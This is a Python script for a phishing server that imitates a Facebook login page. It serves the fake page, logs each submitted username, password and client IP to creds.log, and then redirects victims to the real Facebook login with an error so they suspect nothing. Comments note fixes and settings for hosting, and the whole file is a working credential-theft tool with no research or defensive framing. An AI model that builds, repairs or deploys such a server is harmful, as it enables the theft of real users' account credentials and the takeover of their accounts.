import http.server
import socketserver
import urllib.parse
import ssl
import logging
import os

# --- Render-Friendly Config ---
# Corrected: Added quotes around "PORT"
PORT = int(os.environ.get("PORT", 8080)) 
LOG_FILE = "creds.log"
HTML_FILE = "facebook_login.html"

USE_SSL = False 
CERT_FILE = "server.crt"
KEY_FILE = "server.key"

# Corrected: Added quotes around the format string
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Corrected: Added quotes around paths and content-type
        if self.path == "/" or self.path == f"/{HTML_FILE}":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            if os.path.exists(HTML_FILE):
                with open(HTML_FILE, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"Error: Login page not found on server.")
        else:
            super().do_GET()

    def do_POST(self):
        # Corrected: Added quotes around Content-Length
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        
        username = params.get("username", [""])[0]
        password = params.get("password", [""])[0]
        
        log_msg = f"Caught: user={username}, pass={password}, IP={self.client_address[0]}"
        logging.info(log_msg)
        print(log_msg)
        
        self.send_response(302)
        self.send_header("Location", "https://www.facebook.com/login/?error=invalid")
        self.end_headers()

    def log_message(self, format, *args):
        pass

def run_server():
    socketserver.TCPServer.allow_reuse_address = True
    # Corrected: Added quotes around the 0.0.0.0 IP address
    with socketserver.TCPServer(("0.0.0.0", PORT), PhishHandler) as httpd:
        proto = "HTTP"
        print(f"[+] {proto} Phishing Server live on port {PORT}")
        try:
            httpd.serve_forever()
        except Exception as e:
            print(f"Server Error: {e}")
            httpd.server_close()

if __name__ == "__main__":
    # Extra safety: Create the HTML file if you forgot to upload it
    if not os.path.exists(HTML_FILE):
        with open(HTML_FILE, "w") as f:
            f.write("<html><body><h1>Facebook Login Page Simulation</h1><form method='POST'><input name='username'><input name='password' type='password'><input type='submit'></form></body></html>")
    
    run_server()
